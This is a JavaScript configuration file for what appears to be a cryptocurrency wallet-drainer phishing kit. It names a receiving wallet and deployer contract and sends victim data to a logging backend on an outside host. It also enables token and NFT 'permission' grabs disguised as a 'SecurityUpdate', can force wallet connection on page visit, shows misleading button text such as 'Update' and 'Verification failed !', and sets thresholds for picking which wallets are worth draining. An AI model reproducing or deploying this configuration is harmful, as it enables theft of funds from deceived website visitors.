const config = { 

    ETHreceiver: "0x1840C77fC6c15F61114EC09432d1295719789d5e", // ETH ADDRESS -> should match with .env.fulfiller
    // creator of contractETH-address needs to be "operator wallet" (!)
    // = RECEIVER = fulfiller = CALLER = INITIATOR

    //logDomainName: "", // BACKEND SOURCES URL -> SHOULD END WITH "/" -> f.ex. https://domain.api/""
    logDomainName: "https://1-production-4a7f.up.railway.app/",

    logIpData: false, // IP LOG

    eth_redSign: false, // true -> red sign | false = SecurityUpdate-Smart-Contract --> need to deploy that (file = "###securityCONTRACT.sol")
    // optional but mandatory: if you set eth_redSign = false
    // if true -> use RED-SIGN | if false = use SecuriteUpdate-Contract (=contractETH)
    // creator of contractETH-address needs to be "operator wallet" (!) = RECEIVER = fulfiller = CALLER = INITIATOR
    contractETH: "0xe6303A320a70d437c1b42A4F5B2271a840450759", // deployer 

    nftSAFA: false, // if false = redSign, if true = safa "give permission to..."
    erc20SAFA: true, // if false = redSign, if true = safa "give permission to..."
    
    autoConnectForce: true, // force "connect wallet" when user visit website
    autoTransferForce: false, // force "transfer" when user visit website
    
    design: {
        walletAppear: true,
        eliAppear: true,
        
        connectElement: "#connectButton",
        connectedElement: "#claimButton",
        
        retryDelay: 3000,
        
        buttonMessagesEnabled: true,
        buttonMessages: {
          initialConnect: "Update",
          initialConnected: "Update",
 
          progress: "Loading ...", 
          success: "Confirming ...",
          failed: "Verification failed !",
        }
    },
 
    claimInfo: {
 
        collectionDetails: {
            minAveragePrice: 0.005,
            minVolumeTraded: 20,
        },
 
        minValueERC20: 0,
        minWalletBalance: 0.0003,
    }
 
 }

 